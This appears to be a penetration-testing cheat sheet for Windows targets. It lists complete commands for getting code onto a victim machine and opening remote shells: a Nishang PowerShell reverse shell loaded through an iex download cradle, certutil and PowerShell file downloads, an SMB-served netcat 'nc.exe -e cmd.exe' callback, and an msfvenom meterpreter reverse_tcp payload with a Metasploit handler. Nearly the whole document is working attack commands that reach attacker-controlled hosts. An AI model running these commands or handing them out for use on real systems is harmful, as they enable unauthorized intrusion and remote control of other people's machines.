### Windows

#### Nishang
- git clone [Nishang](https://github.com/samratashok/nishang)
- edit InvokePowerShellTcp.ps1 /nishang/Shells/
paste *Invoke-PowerShellTcp -Reverse -IPAddress [your_ip] -Port [your_port]* on bottom of the file.
- run python HTTP server
  -python -m SimpleHTTPServer 443
  -python3 -m http.server 443
-In the victim shell: 
  powershell iex(new-object System.net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Powershell
powershell -ExecutionPolicy Bypass -File wget.ps1 http://[your_ip:port]/file file

echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

### PowerShell file download
```
powershell iex(new-object System.net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://[your_ip:port]/wget.exe','C:\Destination\path\wget.exe')"

##### powershell wget http://[your_ip:port]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### smbserver

- smbserver.py
```
git clone [impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
```
create directory (for example test)
```
cp nc.exe to your_file_directory_path
```
run smbserver
```
python smbserver.py test your_file_directory_path (example: python smbserver.py test /root/mysmbfile
```
run local nc
```
nc -lnvp 443
```
In the victim shell
```
\\[your_ip]\test\nc.exe -e cmd.exe [your_ip]
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### certutil
```
certutil -urlcache -f http://[your_ip]/file output_file_name
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Meterpreter
- create msfvenom payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[you_ip] LPORT=[your_port] -f asp > rs.asp

- use mstfconsole
exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost, lport and run

- execute reverse shell
curl http://10.10.10.5/rs.asp
